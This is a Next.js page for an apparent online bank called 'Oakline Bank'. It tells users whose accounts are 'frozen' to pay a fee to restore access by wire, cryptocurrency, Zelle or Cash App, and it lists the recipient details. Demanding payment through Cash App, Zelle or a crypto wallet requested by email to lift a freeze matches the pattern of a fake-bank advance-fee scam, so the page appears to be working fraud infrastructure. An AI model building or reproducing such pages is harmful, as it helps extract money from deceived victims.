import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';
import Link from 'next/link';
import { supabase } from '../../lib/supabaseClient';

const useMediaQuery = (query) => {
  const [matches, setMatches] = useState(false);
  useEffect(() => {
    const media = window.matchMedia(query);
    if (media.matches !== matches) setMatches(media.matches);
    const listener = () => setMatches(media.matches);
    media.addEventListener('change', listener);
    return () => media.removeEventListener('change', listener);
  }, [matches, query]);
  return matches;
};

const paymentMethodDetails = {
  wire: {
    name: 'Wire Transfer',
    icon: '🏦',
    instructions: [
      'Use the bank details below to initiate a wire transfer from your external bank account',
      'Include your account reference number in the transfer memo/description',
      'Wire transfers typically take 1-2 business days to process',
      'Once received, your account freeze will be lifted within 24-48 hours'
    ]
  },
  crypto: {
    name: 'Cryptocurrency',
    icon: '₿',
    instructions: [
      'Select your preferred cryptocurrency below',
      'Send the exact amount to the provided wallet address',
      'Wait for network confirmations (varies by cryptocurrency)',
      'Once confirmed, your account freeze will be lifted within 24-48 hours'
    ]
  },
  zelle: {
    name: 'Zelle',
    icon: '💸',
    instructions: [
      'Open your banking app that supports Zelle',
      'Send payment to the email or phone number provided below',
      'Include your account reference in the memo',
      'Zelle payments are typically instant - your freeze will be lifted within 24-48 hours'
    ]
  },
  cashapp: {
    name: 'Cash App',
    icon: '💵',
    instructions: [
      'Open the Cash App on your mobile device',
      'Send payment to the $Cashtag provided below',
      'Include your account reference in the note',
      'Once received, your account freeze will be lifted within 24-48 hours'
    ]
  }
};

export default function PaymentMethod() {
  const router = useRouter();
  const { method, amount } = router.query;
  const isMobile = useMediaQuery('(max-width: 768px)');

  const [user, setUser] = useState(null);
  const [profile, setProfile] = useState(null);
  const [loading, setLoading] = useState(true);
  const [bankDetails, setBankDetails] = useState(null);
  const [freezeAmount, setFreezeAmount] = useState(0);
  const [copied, setCopied] = useState('');

  const methodInfo = paymentMethodDetails[method] || paymentMethodDetails.wire;

  useEffect(() => {
    if (amount) {
      setFreezeAmount(parseFloat(amount) || 0);
    }
  }, [amount]);

  useEffect(() => {
    checkUserAndFetchData();
  }, []);

  const checkUserAndFetchData = async () => {
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session?.user) {
        router.push('/sign-in');
        return;
      }
      setUser(session.user);

      const [profileRes, bankRes] = await Promise.all([
        supabase
          .from('profiles')
          .select('is_frozen, frozen_reason, freeze_amount_required, full_name')
          .eq('id', session.user.id)
          .single(),
        supabase
          .from('bank_details')
          .select('*')
          .limit(1)
          .single()
      ]);

      if (profileRes.data) {
        setProfile(profileRes.data);
        if (!amount && profileRes.data.freeze_amount_required) {
          setFreezeAmount(parseFloat(profileRes.data.freeze_amount_required) || 0);
        }
      }

      if (bankRes.data) {
        setBankDetails(bankRes.data);
      }
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  const formatCurrency = (amount) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD'
    }).format(amount || 0);
  };

  const copyToClipboard = (text, label) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(''), 2000);
  };

  const CopyButton = ({ text, label }) => (
    <button
      onClick={() => copyToClipboard(text, label)}
      style={{
        padding: '0.5rem 0.75rem',
        backgroundColor: copied === label ? '#10b981' : '#f1f5f9',
        color: copied === label ? '#ffffff' : '#475569',
        border: 'none',
        borderRadius: '6px',
        fontSize: '0.8rem',
        cursor: 'pointer',
        fontWeight: '500',
        transition: 'all 0.2s ease'
      }}
    >
      {copied === label ? 'Copied!' : 'Copy'}
    </button>
  );

  if (loading) {
    return (
      <div style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #1a365d 0%, #059669 100%)'
      }}>
        <div style={{
          width: '40px',
          height: '40px',
          border: '3px solid rgba(255,255,255,0.3)',
          borderTop: '3px solid white',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite'
        }} />
        <style jsx>{`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}</style>
      </div>
    );
  }

  return (
    <>
      <Head>
        <title>{methodInfo.name} Payment - Oakline Bank</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #1a365d 0%, #059669 100%)'
      }}>
        {/* Header */}
        <header style={{
          maxWidth: '1200px',
          margin: '0 auto',
          padding: isMobile ? '1rem' : '1.5rem 2rem',
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center'
        }}>
          <Link href="/" style={{
            display: 'flex',
            alignItems: 'center',
            gap: '0.75rem',
            textDecoration: 'none'
          }}>
            <img 
              src="/images/Oakline_Bank_logo_design_c1b04ae0.png" 
              alt="Oakline Bank" 
              style={{ height: isMobile ? '36px' : '44px' }}
            />
            <div>
              <h1 style={{
                fontSize: isMobile ? '1.125rem' : '1.375rem',
                fontWeight: '700',
                color: '#ffffff',
                margin: 0
              }}>Oakline Bank</h1>
              <span style={{
                fontSize: '0.75rem',
                color: 'rgba(255,255,255,0.8)'
              }}>Your Financial Partner</span>
            </div>
          </Link>
          <Link href="/freeze-payment" style={{
            padding: '0.6rem 1.2rem',
            backgroundColor: 'rgba(255,255,255,0.15)',
            color: 'white',
            textDecoration: 'none',
            borderRadius: '8px',
            fontSize: '0.9rem',
            border: '1px solid rgba(255,255,255,0.25)'
          }}>
            ← Back
          </Link>
        </header>

        {/* Main Content */}
        <main style={{
          maxWidth: '800px',
          margin: '0 auto',
          padding: isMobile ? '1rem' : '2rem'
        }}>
          {/* Title */}
          <div style={{ textAlign: 'center', marginBottom: '2rem' }}>
            <div style={{
              width: '70px',
              height: '70px',
              backgroundColor: 'rgba(255,255,255,0.15)',
              borderRadius: '50%',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              margin: '0 auto 1rem',
              fontSize: '2rem'
            }}>
              {methodInfo.icon}
            </div>
            <h1 style={{
              fontSize: isMobile ? '1.75rem' : '2.25rem',
              fontWeight: '700',
              color: '#ffffff',
              marginBottom: '0.5rem'
            }}>
              {methodInfo.name} Payment
            </h1>
            <p style={{
              fontSize: '1rem',
              color: 'rgba(255,255,255,0.9)'
            }}>
              Complete your payment to restore account access
            </p>
          </div>

          {/* Payment Card */}
          <div style={{
            backgroundColor: '#ffffff',
            borderRadius: '20px',
            boxShadow: '0 20px 60px rgba(0, 0, 0, 0.2)',
            overflow: 'hidden'
          }}>
            {/* Amount Header */}
            <div style={{
              background: 'linear-gradient(135deg, #059669 0%, #047857 100%)',
              padding: '1.5rem 2rem',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center'
            }}>
              <div>
                <p style={{
                  fontSize: '0.875rem',
                  color: 'rgba(255,255,255,0.85)',
                  margin: '0 0 0.25rem 0'
                }}>
                  Amount to Pay
                </p>
                <p style={{
                  fontSize: isMobile ? '1.75rem' : '2rem',
                  fontWeight: '700',
                  color: '#ffffff',
                  margin: 0
                }}>
                  {formatCurrency(freezeAmount)}
                </p>
              </div>
              <div style={{
                backgroundColor: 'rgba(255,255,255,0.2)',
                padding: '0.5rem 1rem',
                borderRadius: '8px'
              }}>
                <p style={{
                  fontSize: '0.75rem',
                  color: 'rgba(255,255,255,0.9)',
                  margin: 0,
                  fontWeight: '600'
                }}>
                  Reference: {user?.id?.slice(0, 8).toUpperCase() || 'N/A'}
                </p>
              </div>
            </div>

            {/* Instructions */}
            <div style={{
              padding: isMobile ? '1.5rem' : '2rem',
              borderBottom: '1px solid #e5e7eb'
            }}>
              <h3 style={{
                fontSize: '1rem',
                fontWeight: '600',
                color: '#1a365d',
                margin: '0 0 1rem 0'
              }}>
                Payment Instructions
              </h3>
              <ol style={{
                margin: 0,
                padding: '0 0 0 1.25rem',
                color: '#475569',
                fontSize: '0.9rem',
                lineHeight: '1.9'
              }}>
                {methodInfo.instructions.map((instruction, index) => (
                  <li key={index} style={{ marginBottom: '0.5rem' }}>{instruction}</li>
                ))}
              </ol>
            </div>

            {/* Payment Details */}
            <div style={{
              padding: isMobile ? '1.5rem' : '2rem'
            }}>
              {method === 'wire' && bankDetails && (
                <>
                  <h3 style={{
                    fontSize: '1rem',
                    fontWeight: '600',
                    color: '#1a365d',
                    margin: '0 0 1rem 0'
                  }}>
                    Bank Details
                  </h3>
                  <div style={{
                    display: 'grid',
                    gap: '0.75rem'
                  }}>
                    {[
                      { label: 'Bank Name', value: bankDetails.name || 'Oakline Bank' },
                      { label: 'Routing Number', value: bankDetails.routing_number || '075915826' },
                      { label: 'SWIFT Code', value: bankDetails.swift_code || 'OAKLUS33' },
                      { label: 'Bank Address', value: bankDetails.address || '12201 N May Avenue, Oklahoma City, OK 73120' },
                      { label: 'Reference/Memo', value: user?.id?.slice(0, 8).toUpperCase() || 'N/A' }
                    ].map((item) => (
                      <div key={item.label} style={{
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        padding: '0.875rem 1rem',
                        backgroundColor: '#f8fafc',
                        borderRadius: '10px',
                        border: '1px solid #e5e7eb'
                      }}>
                        <div>
                          <p style={{
                            fontSize: '0.75rem',
                            color: '#64748b',
                            margin: '0 0 0.125rem 0',
                            fontWeight: '500'
                          }}>
                            {item.label}
                          </p>
                          <p style={{
                            fontSize: '0.95rem',
                            color: '#1e293b',
                            margin: 0,
                            fontWeight: '600'
                          }}>
                            {item.value}
                          </p>
                        </div>
                        <CopyButton text={item.value} label={item.label} />
                      </div>
                    ))}
                  </div>
                </>
              )}

              {method === 'crypto' && (
                <>
                  <h3 style={{
                    fontSize: '1rem',
                    fontWeight: '600',
                    color: '#1a365d',
                    margin: '0 0 1rem 0'
                  }}>
                    Cryptocurrency Options
                  </h3>
                  <p style={{
                    fontSize: '0.9rem',
                    color: '#64748b',
                    margin: '0 0 1rem 0'
                  }}>
                    Contact our support team at <a href="mailto:crypto@theoaklinebank.com" style={{ color: '#059669', fontWeight: '500' }}>crypto@theoaklinebank.com</a> to receive your personalized wallet address for Bitcoin, Ethereum, USDT, or other supported cryptocurrencies.
                  </p>
                  <div style={{
                    backgroundColor: '#f0fdf4',
                    borderRadius: '10px',
                    padding: '1rem',
                    border: '1px solid #bbf7d0'
                  }}>
                    <p style={{
                      fontSize: '0.875rem',
                      color: '#15803d',
                      margin: 0,
                      lineHeight: '1.6'
                    }}>
                      <strong>Supported:</strong> Bitcoin (BTC), Ethereum (ETH), Tether (USDT), USD Coin (USDC), and more. Exchange rates are calculated at the time of confirmation.
                    </p>
                  </div>
                </>
              )}

              {method === 'zelle' && (
                <>
                  <h3 style={{
                    fontSize: '1rem',
                    fontWeight: '600',
                    color: '#1a365d',
                    margin: '0 0 1rem 0'
                  }}>
                    Zelle Payment Details
                  </h3>
                  <div style={{
                    display: 'grid',
                    gap: '0.75rem'
                  }}>
                    {[
                      { label: 'Zelle Email', value: bankDetails?.email_billing || 'payments@theoaklinebank.com' },
                      { label: 'Reference/Memo', value: user?.id?.slice(0, 8).toUpperCase() || 'N/A' }
                    ].map((item) => (
                      <div key={item.label} style={{
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        padding: '0.875rem 1rem',
                        backgroundColor: '#f8fafc',
                        borderRadius: '10px',
                        border: '1px solid #e5e7eb'
                      }}>
                        <div>
                          <p style={{
                            fontSize: '0.75rem',
                            color: '#64748b',
                            margin: '0 0 0.125rem 0',
                            fontWeight: '500'
                          }}>
                            {item.label}
                          </p>
                          <p style={{
                            fontSize: '0.95rem',
                            color: '#1e293b',
                            margin: 0,
                            fontWeight: '600'
                          }}>
                            {item.value}
                          </p>
                        </div>
                        <CopyButton text={item.value} label={item.label} />
                      </div>
                    ))}
                  </div>
                </>
              )}

              {method === 'cashapp' && (
                <>
                  <h3 style={{
                    fontSize: '1rem',
                    fontWeight: '600',
                    color: '#1a365d',
                    margin: '0 0 1rem 0'
                  }}>
                    Cash App Payment Details
                  </h3>
                  <div style={{
                    display: 'grid',
                    gap: '0.75rem'
                  }}>
                    {[
                      { label: '$Cashtag', value: '$OaklineBank' },
                      { label: 'Reference/Memo', value: user?.id?.slice(0, 8).toUpperCase() || 'N/A' }
                    ].map((item) => (
                      <div key={item.label} style={{
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        padding: '0.875rem 1rem',
                        backgroundColor: '#f8fafc',
                        borderRadius: '10px',
                        border: '1px solid #e5e7eb'
                      }}>
                        <div>
                          <p style={{
                            fontSize: '0.75rem',
                            color: '#64748b',
                            margin: '0 0 0.125rem 0',
                            fontWeight: '500'
                          }}>
                            {item.label}
                          </p>
                          <p style={{
                            fontSize: '0.95rem',
                            color: '#1e293b',
                            margin: 0,
                            fontWeight: '600'
                          }}>
                            {item.value}
                          </p>
                        </div>
                        <CopyButton text={item.value} label={item.label} />
                      </div>
                    ))}
                  </div>
                </>
              )}

              {/* Important Notice */}
              <div style={{
                marginTop: '1.5rem',
                backgroundColor: '#fef3c7',
                borderRadius: '10px',
                padding: '1rem',
                border: '1px solid #fcd34d'
              }}>
                <p style={{
                  fontSize: '0.875rem',
                  color: '#92400e',
                  margin: 0,
                  lineHeight: '1.6'
                }}>
                  <strong>Important:</strong> Please include your reference number ({user?.id?.slice(0, 8).toUpperCase() || 'N/A'}) in all payment communications to ensure proper crediting to your account.
                </p>
              </div>

              {/* Contact Support */}
              <div style={{
                marginTop: '1.5rem',
                textAlign: 'center'
              }}>
                <p style={{
                  fontSize: '0.875rem',
                  color: '#64748b',
                  margin: '0 0 0.5rem 0'
                }}>
                  Already made the payment?
                </p>
                <button
                  onClick={() => router.push('/dashboard')}
                  style={{
                    padding: '0.875rem 2rem',
                    backgroundColor: '#1a365d',
                    color: '#ffffff',
                    border: 'none',
                    borderRadius: '10px',
                    fontSize: '0.95rem',
                    fontWeight: '600',
                    cursor: 'pointer'
                  }}
                >
                  Return to Dashboard
                </button>
                <p style={{
                  fontSize: '0.8rem',
                  color: '#94a3b8',
                  margin: '1rem 0 0 0'
                }}>
                  Your account will be updated automatically once payment is confirmed.
                </p>
              </div>
            </div>
          </div>

          {/* Support */}
          <div style={{
            marginTop: '1.5rem',
            padding: '1rem 1.5rem',
            backgroundColor: 'rgba(255,255,255,0.1)',
            borderRadius: '12px',
            border: '1px solid rgba(255,255,255,0.2)',
            textAlign: 'center'
          }}>
            <p style={{
              fontSize: '0.875rem',
              color: 'rgba(255,255,255,0.9)',
              margin: 0,
              lineHeight: '1.6'
            }}>
              Questions? Contact our support team at{' '}
              <a href="mailto:support@theoaklinebank.com" style={{ color: '#ffffff', fontWeight: '600' }}>
                support@theoaklinebank.com
              </a>
              {' '}or call{' '}
              <a href="tel:+16366356122" style={{ color: '#ffffff', fontWeight: '600' }}>
                +1 (636) 635-6122
              </a>
            </p>
          </div>
        </main>
      </div>
    </>
  );
}
